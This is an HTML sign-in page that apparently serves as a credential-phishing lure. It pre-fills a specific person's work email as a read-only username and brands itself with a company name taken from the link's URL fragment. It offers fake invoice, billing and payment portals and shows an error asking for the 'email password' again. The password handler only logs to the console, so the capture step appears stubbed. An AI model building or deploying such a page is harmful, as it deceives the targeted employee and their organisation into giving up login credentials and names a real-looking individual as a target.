<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title id="pageTitle">Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <style>
        /* Full-Page Background Styling */
        body {
            background: url("assets/img/zbg.jpg") no-repeat center center fixed;
            background-size: cover; /* Ensure background covers the entire viewport */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* Full-screen height */
        }

        #main-outer-container {
            width: 100%;
            max-width: 420px; /* Limit container width */
            background: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15); /* Shadow effect */
            border-radius: 8px; /* Rounded corners */
        }

        #main-inner-container {
            padding: 30px; /* Padding for content */
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0D5CAB; /* Blue button */
            color: #FFFFFF;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin-top: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0A4B8A; /* Slightly darker shade on hover */
        }

        #companyName {
            color: #0D5CAB;
            font-size: 24px; /* Larger font size for emphasis */
            text-align: center;
            font-weight: bold;
            margin-bottom: 16px;
        }

        #error-message {
            color: #a94442;
            background: #f2dede;
            border: 1px solid rgb(128, 0, 0);
            padding: 15px;
            font-size: 16px;
            margin-bottom: 16px;
            border-radius: 4px;
            text-align: center;
            display: none; /* Initially hidden */
        }

        img#logoImg {
            height: 84px;
            width: auto;
            display: block;
            margin: auto;
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            padding: 1px 8px;
            border-radius: 4px;
            margin-bottom: 16px;
        }

        select {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 12px;
            margin-bottom: 16px;
        }

        footer {
            text-align: center;
            font-size: 12px;
            color: #555;
            margin-top: 16px;
        }
    </style>
</head>

<body>
    <div id="main-outer-container">
        <div id="main-inner-container">
            <div id="form-main-outer">
                <!-- Logo Section -->
                <div>
                    <img id="logoImg" src="assets/img/LoginBanner.png" alt="Logo" />
                </div>

                <!-- Company Name -->
                <h5 id="companyName"></h5>

                <!-- Error Message -->
                <div id="error-message">
                    The password is incorrect. Try again with your email password.
                </div>

                <!-- Form Section -->
                <div>
                    <p>Username:</p>
                    <input type="text" id="email" value="sayantanr@pinnacleinfotech.com" readonly>
                    <p>Password:</p>
                    <input type="password" id="password" placeholder="Password">
                    <button type="button" onclick="nextFun();">Sign In</button>
                </div>

                <!-- Footer Section -->
                <div>
                    <select>
                        <option value="Client Invoice Portal">Client Invoice Portal</option>
                        <option value="Billing Portal">Billing Portal</option>
                        <option value="Payment Portal">Payment Portal</option>
                    </select>
                    <footer>&copy; 2025 TheOutdoorGroup</footer>
                </div>
            </div>
        </div>
    </div>

    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (!hash.includes("@")) return;

            const emailParts = hash.split("@");
            const domain = emailParts[1].toLowerCase();

            const companyNameMapping = {
                "pinnacleinfotech.com": "PINNACLEINFOTECH",
                "examplecompany.com": "EXAMPLECOMPANY",
            };

            const companyRootName = domain.split(".")[0].toUpperCase();
            const companyName = companyNameMapping[domain] || companyRootName;

            document.getElementById("companyName").textContent = companyName;

            const logo = document.getElementById("logoImg");
            const fallback = "assets/img/LoginBanner.png";

            logo.onerror = () => {
                logo.src = fallback; /* Fallback to default logo for failed loading */
            };
        });

        function nextFun() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email.length === 0 || password.length === 0) {
                const errorDiv = document.getElementById("error-message");
                errorDiv.style.display = "block";
                errorDiv.innerText = "Email or Password is empty.";
                setTimeout(() => {
                    errorDiv.style.display = "none";
                }, 2000);
                return;
            }

            console.log("Perform login validation for:", email, password);
        }
    </script>
</body>

</html>
